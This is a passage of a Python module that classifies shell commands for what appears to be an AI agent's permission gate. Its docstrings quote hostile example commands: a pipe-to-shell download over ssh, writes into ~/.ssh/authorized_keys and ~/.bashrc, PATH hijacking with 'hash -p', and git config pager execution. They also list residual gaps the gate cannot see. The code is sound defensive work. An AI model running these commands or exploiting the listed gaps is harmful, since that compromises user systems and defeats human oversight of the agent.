"""Structural classification of a ``bash_exec`` command string (PRD §3.2).

Implements steps 1-8 of ``.planning/2026-09-11-zed-acp-and-permission-spine-prd.md`` §3.2:
heredoc bodies are data (never commands), substitutions are lifted before anything is
dropped, splitting respects quoting, wrappers peel, payloads lift, and the surviving
signature carries the flags that change what a command *does* — so a grant on ``rm`` can
never cover ``rm -rf`` (critic finding 12).

Pure and stdlib-only: no filesystem, no environment, no expansion. Targets are reported as
written (``~/.ssh/id_rsa`` stays a tilde string); resolving them against the boundary is the
verdict's job (A2, PRD §3.1). ``shlex`` tokenizes one already-split command; the splitting,
quoting, heredoc and substitution work above it is ours because ``shlex`` has no notion of
shell grammar.

Two conventions the PRD leaves open, decided here and kept consistent:

* **Script arguments are not part of the signature.** ``python3 build.py`` and
  ``python3 tools/x.py`` share the key ``python3 <script>``; a module keeps its real name
  (``python3 -m pip``) because the module *is* the program. This is the gap PRD §3.2 names
  ("anything reached through a granted ``python3 FILE``") — it is stated, not hidden.
* **Runners compose rather than peel** (:data:`COMPOSING_RUNNERS`): ``uv run python -c "…"``
  is ``uv run python -c``, and the inner command's destructive / inline / write-target facts
  propagate to the composed segment. Peeling would erase the runner; ignoring the inner
  command would let ``uv run rm -rf x`` read as a plain ``uv run``.

**Residual gaps**, stated here rather than discovered later. Each one ends in an ask, never in a
silent allow, but an ask is grantable and a grant on one of these keys is broader than it looks:

* **Inline program text is not parsed.** The payload of ``python3 -c``, ``ruby -e``, ``perl -e``,
  ``awk '{…}'`` and ``powershell -EncodedCommand <base64>`` is another language (or base64), and
  none of it is read. These commands classify as ``interpreter-inline``, which says truthfully
  "this runs code the gate cannot see" — and says nothing about what the code does.
  ``system("rm -rf /")`` inside an awk program is invisible here.
* **A PowerShell or cmd payload is re-parsed as shell**, which is an approximation of two
  grammars that are not shell (see :data:`NON_SHELL_INTERPRETERS`).
* **Signatures are case-sensitive**, except where a shell's own rule says otherwise (the Windows
  verbs and flags of :data:`CASE_FOLDED_FLAG_INTERPRETERS` and :data:`SPELLED_FLAG_LEADERS`). A
  differently-cased spelling of a rule-set entry reads as unfamiliar — it asks, rather than
  matching the read-only or destructive tier.
* **A script's contents are not read**, by design: the classifier is pure. ``python3 build.py``
  and ``source ./env.sh`` are keyed as ``<script>`` and whatever the file does is not here.
"""

from __future__ import annotations

import fnmatch
import posixpath
import re
import shlex
from dataclasses import replace
from typing import NamedTuple, Optional, Sequence

from .gate_types import (
    COMMAND_VALUED_ENV_VARS,
    DOTTED_VARIANT_SEPARATOR,
    ENV_REDIRECT_EXCLUDED,
    GateSettings,
    ShellClassification,
    UNPARSED_SHELL_SIGNATURE,
    ShellSegment,
)

# --------------------------------------------------------------------------- constants

SUBSTITUTION_SENTINEL = "$__lh_subst__"
"""Placeholder left behind by PRD §3.2 step 2 when a substitution is lifted out.

It carries a ``$`` on purpose: whatever the substitution produced is unknown at
classification time, so any write target built from it is ``unresolvable_write`` (step 8).
"""

DIRECTORY_CHANGE_COMMANDS = frozenset({"cd", "pushd"})
"""Commands that move the shell, so every LATER segment of the same sequence writes somewhere
else (finding R2a). ``cd ~/.ssh && echo x >> authorized_keys`` used to drop the ``cd`` and report
the bare ``authorized_keys``, which the verdict then resolved against the workspace — the write
landed on the protected file with nothing asked. Both spellings move; ``pushd`` also stacks."""

DIRECTORY_RESTORE_COMMANDS = frozenset({"popd"})
"""``popd`` returns to whatever ``pushd`` stacked. The classifier does not model that stack, so a
pop makes the directory unknown and every later relative write unresolvable — the safe direction
(an unresolvable target is treated as outside the boundary, PRD §3.2 step 8)."""

HOME_DIRECTORY = "~"
"""Where a bare ``cd`` goes (bash(1)). Written as a tilde, like every other target: expanding it
is the verdict's job (PRD §3.1), not the classifier's — it never touches the environment."""

PREVIOUS_DIRECTORY = "-"
"""``cd -`` returns to ``$OLDPWD``, which is not knowable from the command text alone."""

ABSOLUTE_PATH_RE = re.compile(r"^(/|~|[A-Za-z]:[\\/])")
"""A target that already names its own root — POSIX, a tilde (the verdict expands it), or a
Windows drive (the owner dogfoods on Windows). Nothing is joined onto these."""

UNRESOLVABLE_TARGET_CHARS = ("$", "*", "?", "`", "{")
"""PRD §3.2 step 8: a target containing any of these cannot be resolved to a path here, so
it is treated as outside the boundary.

``{`` covers the two shapes that stand in for a path nobody has chosen yet: brace expansion
(``cp a b{1,2}``) and the ``{}`` placeholder a ``find -exec`` / ``xargs -I`` payload substitutes.
The placeholder became visible when clustered flags started signing as writes (finding R7) —
``find . -exec sed -Ei s/a/b/ {} +`` would otherwise have reported a write to a workspace file
literally named ``{}``."""

REDIRECTION_OPERATOR_CHARS = "<>&|"
"""Characters that may follow the first ``<``/``>`` of a redirection operator: ``>>``, ``>|``,
``>&``, ``<&``, ``<<<``, ``&>>``. Consumed as one unit by the splitter so an fd duplication is
never mistaken for the ``&`` separator, and by the redirection parser so ``N>&M`` is read as a
duplication rather than a write."""

REDIRECT_ONLY_SIGNATURE = ">"
"""Signature for a segment that is nothing but a redirection (``> file``). It is a write with
no command; step 8 still has to report its target."""

HERE_STRING_OPERATOR = "<<<"
"""``<<<WORD`` feeds one WORD to stdin. It is an OPERAND, not a heredoc: there is no body and no
delimiter line. Scanning it as a heredoc is the R1 bug — the scanner skipped ``<<<`` at its first
``<`` and then read the SECOND ``<`` as the start of a ``<<`` operator, took the rest of the line
as a delimiter word, and swallowed every following line as a body (bash(1) "Here Strings")."""

ASSIGNMENT_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*\+?=")
"""``K=V`` prefix form. PRD §3.2 step 4: ``env`` skips these before the wrapped command."""

ENV_CARRIER_DECLARERS = frozenset({"export", "declare", "typeset", "readonly", "local"})
"""Builtins whose ``NAME=value`` operands set a variable for every later command in the shell
sequence (Phase 10, D-28, D-57). ``local`` is here because a function body that calls it still
reaches later commands in that body."""

PRINTF_VARIABLE_FLAG = "-v"
"""``printf -v NAME FORMAT …`` writes into the shell variable NAME; the value is unknown, so a
table name counts (D-28)."""

READ_ARRAY_FLAG = "-a"
"""``read -a NAME`` assigns the words to the array NAME; the value is unknown."""

READ_VALUE_FLAGS = frozenset({"-d", "-n", "-N", "-p", "-t", "-u", "-i"})
"""``read`` options that take a value (not a variable name): the next token, or the rest of the
cluster, is skipped when looking for the names ``read`` assigns."""

HASH_PATH_FLAG = "-p"
"""``hash -p PATH NAME`` pins NAME to an arbitrary path for every later lookup in the shell, which
is a ``PATH`` redirect by another door (D-57; verified ``hash -p ./evil_ls ls; ls`` ran evil)."""

IDENTIFIER_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*$")
"""A shell variable name."""

OPERAND_PLACEHOLDER = "__lh_operand__"
"""A plain word (none of ``$*?`{``) appended to a command-valued environment variable's value
before it is classified (Phase 10, D-38). Git appends its operands to ``GIT_PAGER``,
``GIT_EXTERNAL_DIFF`` and ``GIT_EDITOR`` — the paths, the file — so ``sort -o`` must be judged
with an operand present, where it is write-shaped, and ``cat`` stays read-only."""

DURATION_RE = re.compile(r"^\d+(\.\d+)?[smhd]?$")
"""``timeout``'s positional duration (``timeout 30``, ``timeout 1.5m``) — skipped when peeling."""

SHELL_KEYWORDS = frozenset({
    "if", "then", "elif", "else", "fi", "while", "until", "for", "do", "done",
    "case", "esac", "select", "function", "!", "{", "}", "coproc",
})
"""Compound-command keywords. They are grammar, not commands, so they are stripped from the
front of a segment and a keyword-only segment is dropped — otherwise ``do rm -rf $f`` (the
body of a ``for`` loop, which PRD §3.2 step 3's ``;`` split hands us) would classify as ``do``
and hide the ``rm``."""

FUNCTION_DEFINITION_RE = re.compile(
    r"""^(?:
          function\s+(?P<keyword_name>[^\s(){}]+)\s*(?:\(\s*\))?   # function f  /  function f ()
        | (?P<name>[^\s(){}]+)\s*\(\s*\)                            # f()
        )\s*(?P<body>[{(].*)$""",
    re.DOTALL | re.VERBOSE,
)
"""A shell function DEFINITION, in its three spellings (critic finding F3c).

The body is real commands that run when the name is called, so it is recursed into and the
definition itself produces no segment: `function f { rm -rf x; }; f` yields the `rm -rf` plus an
unfamiliar `f`, where before the whole definition classified as a single command named `f` and the
`rm` was invisible. Requiring either the `function` keyword or the `()` is what keeps
`cmd { arg }` — a command with a brace-shaped argument — out of this branch."""

PATH_SEPARATORS = ("/", "\\")
"""A command may be spelled as a path. ``/bin/rm -rf x`` is ``rm -rf`` for signature purposes:
the leading directories are dropped so an absolute spelling cannot dodge the rule sets."""

WRAPPER_VALUE_FLAGS = frozenset({"-n", "-k", "-c", "-u", "-p", "--signal", "--kill-after"})
"""Wrapper flags that consume the next argument (``nice -n 10 cmd``, ``timeout -k 5 2 cmd``),
so the peel does not mistake the value for the wrapped command (PRD §3.2 step 4)."""

WRAPPER_NUMERIC_ARG = frozenset({"timeout"})
"""Wrappers whose first positional argument is a duration, not the wrapped command."""

WRAPPER_HEAD_VALUE_FLAGS: dict[str, frozenset[str]] = {
    "watch": frozenset({"-n", "--interval"}),
    "flock": frozenset({"-w", "--wait", "--timeout", "-E", "--conflict-exit-code",
                        "-c", "--command"}),
    "chroot": frozenset({"--userspec", "--groups"}),
    "caffeinate": frozenset({"-t"}),
    "systemd-run": frozenset({"-u", "--unit", "-p", "--property", "-E", "--setenv", "--slice",
                              "--description", "--uid", "--gid", "--nice", "--working-directory",
                              "-M", "--machine", "--on-active", "--on-calendar"}),
    "uvx": frozenset({"--from", "--with", "--python", "-p", "--project", "--directory"}),
    "command": frozenset(),
    "exec": frozenset({"-a"}),
    "wsl": frozenset({"-d", "--distribution", "-u", "--user", "--cd", "--shell-type"}),
    "env": frozenset({"-u", "--unset", "-C", "--chdir", "-a", "--argv0", "-P"}),
    "time": frozenset({"-f", "--format", "-o", "--output"}),
    "timeout": frozenset({"-s", "--signal", "-k", "--kill-after"}),
}
"""Value-taking options PER wrapper, REPLACING :data:`WRAPPER_VALUE_FLAGS` for these heads.

Replacing rather than extending is the point: the same letter means different things to
different wrappers. ``flock -n`` is ``--nonblock``, a boolean — reading it as a value flag (which
it is for ``nice``) would eat the lock file and peel to the wrong token. Sources: watch(1),
flock(1), chroot(1), caffeinate(8), systemd-run(1), `uvx` (uv docs). A ``--flag=value`` spelling
needs no entry.

``command`` and ``exec`` are the two shell builtins in the wrapper set, and the default table is
wrong for both (v0.14 critic A1). ``command``'s options — ``-p``, ``-v``, ``-V`` — are all
booleans, so the shared ``-p`` entry ate the wrapped command and ``command -p rm -rf x`` peeled
to the signature ``x``: a destructive delete filed as an unfamiliar command named after its own
argument. ``exec``'s ``-a NAME`` is the opposite mistake: it DOES take a value (the argv[0] the
wrapped command is given), so ``exec -a NAME rm -rf x`` peeled to ``NAME``. Sources: bash(1)
SHELL BUILTIN COMMANDS (``command [-pVv]``, ``exec [-cl] [-a name]``)."""

WRAPPER_POSITIONAL_SKIPS: dict[str, int] = {"flock": 1, "chroot": 1}
"""Wrappers whose first positional is an OPERAND, not the wrapped command: ``flock LOCKFILE CMD``
(a file or an fd number) and ``chroot DIR CMD``."""

WRAPPER_SUBCOMMANDS: dict[str, tuple[str, ...]] = {"poetry": ("run",), "pipx": ("run",)}
"""Wrappers that only wrap under one subcommand. ``poetry run rm -rf x`` runs the ``rm``;
``poetry install`` runs poetry's own installer, and peeling it would sign the segment as the
unrelated coreutils ``install``. No match means no peel."""

WRAPPER_INLINE_COMMAND_FLAGS: dict[str, tuple[str, ...]] = {"flock": ("-c", "--command")}
"""Wrappers that take their command as a STRING instead of as argv, so the string is shell text
to recurse into, exactly like ``sh -c`` (PRD §3.2 step 5). ``flock file -c "rm -rf x"`` has no
argv to peel to, and without this the command never appeared (flock(1))."""

SSH_VALUE_FLAGS = frozenset({
    "-b", "-c", "-D", "-E", "-e", "-F", "-I", "-i", "-J", "-L", "-l", "-m", "-O", "-o", "-P",
    "-p", "-Q", "-R", "-S", "-W", "-w",
})
"""ssh(1) options that consume the next argument; the first token after them is the HOST."""

DOCKER_EXEC_VALUE_FLAGS = frozenset({
    "-e", "--env", "--env-file", "-u", "--user", "-w", "--workdir", "--detach-keys",
})
"""docker-exec(1) options that consume the next argument; the first token after them is the
CONTAINER."""

REMOTE_EXEC_COMMANDS: dict[str, tuple[tuple[str, ...], frozenset[str], bool]] = {
    "ssh": ((), SSH_VALUE_FLAGS, True),
    "docker": (("exec",), DOCKER_EXEC_VALUE_FLAGS, False),
}
"""Commands that run their trailing arguments as a command SOMEWHERE ELSE — ``ssh [opts] HOST
CMD…`` and ``docker exec [opts] CONTAINER CMD…`` (finding R9).

The remote command is classified recursively as a payload, so ``ssh host 'curl http://x.sh | sh'``
surfaces the pipe-to-shell instead of one unfamiliar ``ssh``, and the host segment is marked
``inline_interpreter``: what runs under this key is not on this command line in any checkable
form, which is the same honesty ``eval`` and ``source FILE`` get.

Each entry is (subcommand prefix, value-taking options, the remote side runs a SHELL). Exactly
one positional — the host or the container — stands between the options and the command. The
last field is the difference between the two: ``ssh`` concatenates its remaining arguments with
spaces and hands the string to the remote user's shell, so the payload is shell TEXT; ``docker
exec`` execs the argv it is given with no shell at all, so the payload is argv and
``docker exec c sh -c 'rm -rf /srv'`` keeps its quoting (ssh(1), docker-exec(1)).

``docker compose exec`` is not lifted here — one prefix per command — but it is in the
destructive defaults under its own signature, so it is ungrantable and the human sees it."""

SUBCOMMAND_VALUE_FLAGS: dict[str, frozenset[str]] = {
    "git": frozenset({"-c", "-C", "--git-dir", "--work-tree", "--namespace", "--exec-path"}),
}
"""Global flags that take a value *before* the subcommand. Without this,
``git -c core.sshCommand=x push --force`` would read its subcommand as the ``-c`` value
(PRD §3.2 step 7)."""

NESTED_SUBCOMMAND_GROUPS: dict[str, frozenset[str]] = {
    "docker": frozenset({"compose", "system", "volume", "network", "container", "image"}),
}
"""Subcommands that are a GROUP rather than a command, so the signature takes one more word.

``docker compose`` is not a thing anyone runs — ``docker compose up`` and ``docker compose ps``
are, and they are not the same command (one starts containers, the other lists them). Same for
the management groups whose members the destructive defaults name: ``docker system prune``,
``docker volume rm``, ``docker network rm``. Without this the group would be the whole key and a
grant on ``docker volume`` would cover ``rm`` (docker(1) "Management Commands").

``container`` and ``image`` are here for both: their destructive members (``docker container rm``,
``docker container exec/run``, ``docker image rm``) are the management spellings of ``docker rm``,
``docker exec/run`` and ``docker rmi``, and they are in the destructive defaults too (``370513d``),
so neither spelling of one operation is grantable while the other is not. The key still matters
for the rest of the group: ``docker container ls`` is a read nobody needs protection from, and a
grant on it is a grant on that one operation and not on ``container``."""

SUBCOMMAND_OPERATION_WORDS: dict[str, tuple[tuple[str, tuple[str, ...]], ...]] = {
    "git branch": (
        ("-D", ("-D",)), ("-d", ("-d", "--delete")), ("-M", ("-M",)), ("-m", ("-m", "--move")),
        ("-C", ("-C",)), ("-c", ("-c", "--copy")),
    ),
    "git remote": (
        ("set-url", ("set-url",)), ("remove", ("remove",)), ("rm", ("rm",)),
        ("prune", ("prune",)), ("rename", ("rename",)), ("add", ("add",)),
        ("set-head", ("set-head",)), ("set-branches", ("set-branches",)),
        ("update", ("update",)), ("get-url", ("get-url",)), ("show", ("show",)),
    ),
    "git stash": (
        ("drop", ("drop",)), ("clear", ("clear",)), ("pop", ("pop",)), ("apply", ("apply",)),
        ("push", ("push",)), ("save", ("save",)), ("branch", ("branch",)),
        ("create", ("create",)), ("store", ("store",)), ("list", ("list",)), ("show", ("show",)),
    ),
    "git checkout": (("--", ("--", ".")),),
    "git restore": (("--worktree", ("--worktree", "-W")), ("--staged", ("--staged", "-S"))),
    "git worktree": (
        ("remove", ("remove",)), ("move", ("move",)), ("prune", ("prune",)), ("add", ("add",)),
        ("lock", ("lock",)), ("unlock", ("unlock",)), ("repair", ("repair",)), ("list", ("list",)),
    ),
    "git submodule": (
        ("deinit", ("deinit",)), ("add", ("add",)), ("update", ("update",)), ("init", ("init",)),
        ("sync", ("sync",)), ("foreach", ("foreach",)), ("set-url", ("set-url",)),
        ("set-branch", ("set-branch",)), ("absorbgitdirs", ("absorbgitdirs",)),
        ("summary", ("summary",)), ("status", ("status",)),
    ),
    "git reflog": (
        ("expire", ("expire",)), ("delete", ("delete",)), ("exists", ("exists",)),
        ("show", ("show",)),
    ),
    "git gc": (("--prune", ("--prune",)),),
    "git push": (("--delete", ("--delete", "-d")),),
}
"""The OPERATION a two-word signature is missing, when the operation is a third word or a flag.

``git branch`` lists branches and is in the ALLOW tier; ``git branch -D x`` deletes one and is
ungrantable. Both signed as the bare ``git branch``, so the read-only verdict covered the delete —
and the same collapse hid ``git remote set-url`` (repoint a remote at an attacker's host) behind
``git remote``, ``git stash drop`` behind ``git stash``, and ``git restore``'s worktree discard
behind a key that says nothing (v0.14 critic A2). This table restores the distinction the way
:data:`NESTED_SUBCOMMAND_GROUPS` does for docker's management groups, except that git spells some
of its operations as a FLAG (``branch -D``, ``restore --staged``, ``gc --prune``), which a
positional scan cannot see.

Each entry is (canonical suffix, the spellings that mean it), matched by :func:`_matches_flag`, so
``--flag=value`` and a short-option cluster (``git branch -vD``) both land. **First match in TABLE
order wins, not in command-line order** — the same rule as :data:`SED_MODE_FLAGS` — so the more
destructive reading is chosen when a command carries two: ``git restore --staged --worktree`` does
discard the worktree, and signs as ``git restore --worktree``.

Deliberate approximations, named rather than hidden: ``--delete --force`` on a branch spells the
same thing as ``-D`` but signs as ``-d`` (both are destructive, so nothing escapes); ``git
checkout``'s discard is recognized only in its two documented spellings (``--`` and a bare ``.``),
so ``git checkout ./src`` — a pathspec that is also a discard — still signs as the grantable
``git checkout``. Source: git-branch(1), git-remote(1), git-stash(1), git-checkout(1),
git-restore(1), git-worktree(1), git-submodule(1), git-reflog(1), git-gc(1), git-push(1)."""

FLAG_ALIASES: dict[str, tuple[str, ...]] = {
    "r": ("r", "R"),
    "R": ("R", "r"),
    "recursive": ("r", "R"),
    "f": ("f", "force"),
    "force": ("force", "f"),
    "force-with-lease": ("force", "f"),
    "force-if-includes": ("force", "f"),
    "hard": ("hard",),
}
"""Spellings of the destructive flags in ``GateSettings.destructive_flag_verbs``, resolved
against the verb's own canonical ids: ``rm --recursive --force`` → ``rm -rf``, ``git push -f`` →
``git push --force`` (PRD §3.2 step 7, docstring of ``DESTRUCTIVE_FLAG_VERBS_DEFAULT``).

``--force-with-lease`` maps to ``force`` deliberately: it still rewrites the remote, and the
alternative is worse — it would fall back to the bare ``git push`` key, so a grant on an
ordinary push would cover it.
"""

SCRIPT_PLACEHOLDER = "<script>"
"""PRD §3.2 step 7: the key a command that runs a FILE gets. The file's name is deliberately not
in the key (`python3 build.py` and `python3 tools/x.py` share one key) — see the module
docstring; the same placeholder is what ``source FILE`` gets."""

SOURCE_SIGNATURE = "source"
"""Canonical spelling for the ``source``/``.`` builtin, so both spellings of the same command
share one grant key (``source <script>``) instead of the second hiding behind a lone dot."""

NON_SHELL_INTERPRETERS = frozenset({"python", "python3", "node", "ruby", "perl", "uv run"})
"""The interpreters in ``GateSettings.interpreter_commands`` whose inline payload is NOT shell.

Everything else in that set has its ``-c`` string recursed into as shell text (PRD §3.2 step 5).
Naming the exceptions rather than the shells is what makes the knob real (finding R9b): the
hardcoded ``{"sh", "bash", "zsh"}`` it replaces meant adding ``fish`` to ``interpreter_commands``
changed the signature but left ``fish -c 'rm -rf x'`` unopened. A ``python3 -c`` payload is
python and is not re-parsed as shell.

``powershell``, ``pwsh`` and ``cmd`` are deliberately NOT listed as exceptions, which means their
inline payload IS re-parsed as shell (v0.14 critic A4). That is an APPROXIMATION, named here
rather than hidden: PowerShell and cmd are not POSIX shells, but they separate commands with the
same ``;`` and ``|`` (and PowerShell with ``&&``), and quote with the same ``'`` and ``"``, which
is enough for the one job this classifier has on that payload — finding the command names and
their flags. What it does NOT model is PowerShell's own grammar: a pipeline into a cmdlet that
takes a scriptblock, backtick escapes, ``@()``/``$()`` subexpressions, and cmd's ``^`` escape.
A payload that leans on those reads as unfamiliar segments, which ask."""


CASE_FOLDED_FLAG_INTERPRETERS = frozenset({"powershell", "pwsh", "cmd"})
"""Interpreters whose options are matched the way THEY match them, not the way POSIX does.

Two differences, both of which let a command line past the gate unread (v0.14 critic A4):

* Their options are case-insensitive and accept any unambiguous PREFIX, so ``-Command``,
  ``-command``, ``-Comm`` and ``-c`` are one flag — matched folded and by prefix, returning the
  canonical spelling from ``settings.inline_code_flags`` so all of them share ONE grant key.
* The inline flag does not have to come first. ``powershell -ExecutionPolicy Bypass -Command
  "…"`` puts a value-taking option in front of it, and ``cmd /c`` does not start with a dash at
  all — either one ended the ordinary scan at the first non-option token and filed the command
  as ``<script>`` with its payload unopened. For these heads every token is scanned for the
  inline flag before the positional rule applies.

Over-matching a prefix is the safe direction: it puts the command in the ``interpreter-inline``
class, which asks (powershell(1), cmd(1))."""

SPELLED_FLAG_LEADERS = ("-", "/")
"""A ``destructive_flag_verbs`` entry that already carries its own lead character is a Windows
flag spelled in full (``-Recurse``, ``/s``), not a POSIX letter to be clustered into ``-rf``.

The lead character IS the rule: PowerShell's one-dash-one-word options are matched folded and by
prefix, cmd's slash options folded and whole, and the suffix is emitted verbatim and
space-separated (``Remove-Item -Recurse -Force``) instead of through the POSIX cluster format.
Deriving the behavior from the spelling keeps one table for both worlds — see
``WINDOWS_DESTRUCTIVE_FLAG_VERBS`` in ``gate_types``."""


def _is_shell_interpreter(head: str, settings: GateSettings) -> bool:
    """Is this command's inline payload shell text? See :data:`NON_SHELL_INTERPRETERS`."""
    return head in settings.interpreter_commands and head not in NON_SHELL_INTERPRETERS

OPAQUE_INLINE_PROGRAMS = frozenset({"awk", "gawk", "mawk"})
"""Members of ``settings.inline_by_nature`` whose argument is a program in ANOTHER language.

``eval`` joins its arguments and runs them as SHELL, so they are recursed into. An ``awk``
program is awk, and feeding ``'{print $1}'`` back through the shell splitter invents segments out
of its braces and fields — false asks on a command that is usually a read. These keep the
``inline_interpreter`` flag (the honest part: the command runs code, and ``system("rm -rf x")``
inside a program nobody parsed is exactly why) and lose the recursion. The same split
:data:`NON_SHELL_INTERPRETERS` makes for ``python3 -c``."""

COMPOSING_RUNNERS = frozenset({"uv run"})
"""Commands that run another command in a changed environment. PRD §3.2 step 7 lists
``uv run`` as its own interpreter key, so the runner composes with the inner signature
instead of peeling away (see the module docstring)."""

UV_RUN_VALUE_FLAGS = frozenset({"--with", "--python", "-p", "--project", "--directory", "--package"})
"""``uv run`` flags that take a value, skipped when finding the inner command."""

FIND_PAYLOAD_PRIMARIES = ("-exec", "-execdir", "-ok", "-okdir")
"""PRD §3.2 step 5: ``find`` primaries whose argument list up to ``;`` or ``+`` is a command."""

FIND_PAYLOAD_TERMINATORS = (";", "+")
"""End of a ``find -exec`` payload (``\\;`` reaches us as ``;`` after tokenizing)."""

FIND_DELETE_SIGNATURE = "find -delete"
"""PRD §3.2 step 5 / ``DESTRUCTIVE_SIGNATURES_DEFAULT``: ``find -delete`` deletes without a
payload command, so the primary joins the signature (critic finding 4)."""

FIND_COMMAND = "find"
"""The one payload runner whose command sits behind a primary (``-exec``) instead of simply
following the options — every other member of ``settings.payload_commands`` goes through
:func:`_command_payload`."""

FIND_WRITE_PRIMARY_PREFIX = "-fprint"
FIND_WRITE_PRIMARIES = frozenset({"-fls"})
"""``find``'s primaries that WRITE a file named by the next token: ``-fprint``, ``-fprint0``,
``-fprintf FILE FORMAT`` (the prefix covers the bfs/GNU variants) and ``-fls`` (find(1)). The
file is created or truncated, so ``find ~ -maxdepth 0 -fprintf ~/.bashrc x`` overwrites a startup
script from what the tier called a read (Phase 10, D-53)."""

SORT_OUTPUT_OPTION = "output"
SORT_COMPRESS_OPTION = "compress-program"
SORT_VALUE_LETTERS = "ktST"
"""``sort``'s long options of interest and its short options that take a value. GNU getopt accepts
any unambiguous prefix of a long option: ``--o=F`` is ``--output=F`` (a prefix of length 1 is
unambiguous for ``output``) and ``--co=P`` is ``--compress-program=P`` (``--c`` is ambiguous with
``--check``, so the prefix must be at least two). ``-o FILE`` writes the sorted text over FILE,
``--compress-program`` runs a program on the temporary files. ``-k -t -S -T`` take a value, which
must not be read as ``-o`` (``sort -t o f``). Source: sort(1), D-52."""

UNIQ_VALUE_LETTERS = "fsw"
UNIQ_VALUE_OPTIONS = ("skip-fields", "skip-chars", "check-chars")
"""``uniq``'s options whose value is the next token or attached to the letter, so that the value
is not counted as the INPUT operand: ``uniq -f 1 in out`` writes ``out`` (uniq(1), D-52)."""

TREE_OUTPUT_LETTER = "o"
"""``tree -o FILE`` sends the listing to FILE; the letter may be in a cluster (``-ao``) or have
its value attached (``-oFILE``) (tree(1), D-52)."""

RG_PROGRAM_FLAGS = ("--pre", "--hostname-bin")
"""ripgrep flags that RUN the program named by their value (``--pre CMD`` is a preprocessor run on
every file, ``--hostname-bin`` is run to learn the host name). Exact or with ``=``: rg accepts no
abbreviations, and ``--pre-glob`` is a different, harmless flag (rg(1), D-23/D-50)."""

GIT_GREP_PAGER_OPTION = "open-files-in-pager"
"""``git grep -O[PAGER]`` / ``--open-files-in-pager[=PAGER]`` runs a pager on the matches. Long
spellings are matched as a prefix of length two or more (``--op``, ``--open=cmd``), short ones as
any one-dash cluster containing ``O`` (``-nO``, ``-Ovim``): over-matching is the safe direction
(git-grep(1), D-51)."""

XARGS_VALUE_FLAGS = frozenset({"-n", "-I", "-i", "-P", "-d", "-a", "-E", "-s", "-L", "--max-args",
                               "--replace", "--max-procs", "--delimiter", "--arg-file", "--eof",
                               "--max-chars", "--max-lines"})
"""``xargs`` options that consume the next argument; the first token after them is the
payload command (PRD §3.2 step 5)."""

PARALLEL_VALUE_FLAGS = frozenset({"-j", "--jobs", "-n", "--max-args", "-N", "-I", "--replace",
                                  "-L", "--max-lines", "-S", "--sshlogin", "--delay", "--timeout",
                                  "--joblog", "--results", "--tmpdir", "--colsep", "-d",
                                  "--delimiter"})
"""GNU ``parallel`` options that consume the next argument (parallel(1)), same role as
:data:`XARGS_VALUE_FLAGS`."""

PAYLOAD_VALUE_FLAGS: dict[str, frozenset[str]] = {
    "xargs": XARGS_VALUE_FLAGS,
    "parallel": PARALLEL_VALUE_FLAGS,
}
"""Per-runner option tables for :func:`_command_payload`. A runner with no entry is read as
"options are booleans", which is the safe reading: at worst the payload starts one token late and
the segment stays unfamiliar rather than silently read-only."""

PAYLOAD_ARGUMENT_SEPARATORS = (":::", "::::")
"""GNU ``parallel`` separates the command from its ARGUMENTS with these (``parallel rm -rf {} :::
a b``). Everything after one is data for the command, not more command (parallel(1))."""

GIT_PUSH_SIGNATURE = "git push"
GIT_PUSH_DELETE_SIGNATURE = "git push --delete"
GIT_REFSPEC_DELETE_PREFIX = ":"
"""``git push origin :branch`` deletes the remote branch — git's older spelling of
``git push --delete origin branch``, and the one muscle memory still reaches for
(git-push(1): "pushing an empty source deletes the ref").

Without this the colon form signed as a plain, non-destructive ``git push``: the two commands do
exactly the same irreversible thing and only one of them was classified. Canonicalizing it onto
the ``--delete`` signature means both spellings are one entry in every set that names it — the
``auto`` blacklist, the ungrantable destructive defaults, and any grant key."""

GIT_CONFIG_SIGNATURE = "git config"
"""The plain ``git config`` key. A write that is not one of
``GateSettings.git_config_dangerous_keys`` keeps it (grantable); a dangerous one gets its key
appended and goes destructive; a read keeps it and is read-only."""

GIT_INLINE_CONFIG_FLAG = "-c"
GIT_INLINE_CONFIG_ENV_FLAG = "--config-env"
"""``git -c key=value CMD`` and ``git --config-env=key=VAR CMD`` set a config key for ONE command,
on any subcommand — ``git -c core.pager='sh -c evil' log`` turns a read into an exec. Both forms
are scanned on every ``git`` segment and a dangerous key is lifted into its own destructive
segment, so the host command keeps its own signature and the config write is still seen."""

GIT_CONFIG_READ_FLAGS = frozenset({
    "--get", "--get-all", "--get-regexp", "--get-urlmatch", "--get-color", "--get-colorbool",
    "-l", "--list",
})
GIT_CONFIG_WRITE_FLAGS = frozenset({
    "--add", "--unset", "--unset-all", "--replace-all", "--remove-section", "--rename-section",
    "--edit", "-e",
})
GIT_CONFIG_VALUE_FLAGS = frozenset({"--file", "-f", "--blob", "--type", "-t", "--default"})
"""git-config(1)'s three flag families: the ones that read, the ones that write, and the ones
whose next token is a value rather than the key. ``--global``/``--system``/``--local``/
``--worktree`` choose a FILE, not a direction, so they say nothing here — a scope flag with a key
and a value is still a write, which is why the direction is decided by flags and positionals
together."""

GIT_CONFIG_READ_SUBCOMMANDS = frozenset({"get", "list", "get-all", "get-regexp", "get-urlmatch"})
GIT_CONFIG_WRITE_SUBCOMMANDS = frozenset({
    "set", "unset", "add", "replace-all", "remove-section", "rename-section", "edit",
})
"""git 2.46's subcommand spelling (``git config set core.pager x``) alongside the classic flag
form. Without these, the modern spelling of exactly the same write would read as a bare key."""

SED_IN_PLACE_SPELLINGS: tuple[str, ...] = (
    "-i", *(f"--{'in-place'[:length]}" for length in range(1, len("in-place") + 1))
)
"""``-i`` and every GNU getopt prefix of ``--in-place`` (``--i`` … ``--in-place``): ``in-place`` is the
only sed long option starting with ``i``, so ``sed -n --in-pl d f`` empties ``f`` like ``sed -i``."""

SED_MODE_FLAGS: tuple[tuple[str, tuple[str, ...]], ...] = (
    ("-i", SED_IN_PLACE_SPELLINGS),
    ("-n", ("-n", "--quiet", "--silent")),
)
"""``sed``'s mode is its flag: ``sed -n`` is the read-only signature listed in
``READ_ONLY_SIGNATURES_DEFAULT``, ``sed -i`` edits its file arguments in place. First match
wins, so ``sed -n -i`` is a write (PRD §3.2 steps 7-8)."""

CURRENT_DIRECTORY = "."
"""Where a destination-less ``git init`` puts the repository it creates (git-init(1))."""

GIT_CLONE_VALUE_FLAGS = frozenset({
    "-o", "--origin", "-b", "--branch", "-u", "--upload-pack", "--reference",
    "--reference-if-able", "--depth", "--separate-git-dir", "-c", "--config", "-j", "--jobs",
    "--template", "--shallow-since", "--shallow-exclude", "--filter", "--server-option",
